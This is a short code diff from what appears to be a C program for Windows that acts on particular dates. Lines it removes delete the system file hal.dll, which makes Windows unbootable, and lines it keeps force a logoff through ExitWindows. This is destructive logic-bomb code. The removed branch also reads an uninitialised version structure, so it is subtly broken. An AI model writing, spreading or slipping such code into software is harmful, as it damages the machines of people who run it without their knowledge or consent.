@@ -65,15 +65,8 @@ int main() {
 					&si,
 					&pi);
 		}
-	} else if (strcmp(month, "09") == 0 && strcmp(day, "04") == 0) {
+	} else {
 		ExitWindows(0, 0);	
-	} else if (strcmp(month, "09") == 0 && strcmp(day, "07") == 0) {
-		OSVERSIONINFOEX info;
-
-		if (info.dwMajorVersion == 5 && info.dwMinorVersion == 0)
-			DeleteFile(R"(C:\WINNT\system32\hal.dll)");
-		else
-			DeleteFile(R"(C:\Windows\system32\hal.dll)");
 	}
 
 	return 0;
